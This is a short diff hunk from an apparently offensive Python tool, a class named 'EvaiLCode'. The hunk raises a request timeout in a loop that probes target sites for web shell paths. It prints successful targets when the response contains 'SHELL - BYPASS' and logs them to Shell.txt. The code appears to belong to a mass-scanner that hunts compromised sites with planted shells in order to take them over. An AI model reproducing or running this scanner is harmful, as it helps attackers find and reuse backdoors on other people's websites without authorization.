@@ -2223,7 +2223,7 @@ class EvaiLCode:
         try:
             url = "http://" + self.URLdomain(site)
             for Path in Pathlist:
-                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=15).content
+                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=30).content
                 if "SHELL - BYPASS" in check:
                     print('Target:{} --> {}[Succefully]'.format(url, fg))
                     open('Shell.txt', 'a').write(url + Path + "\n")
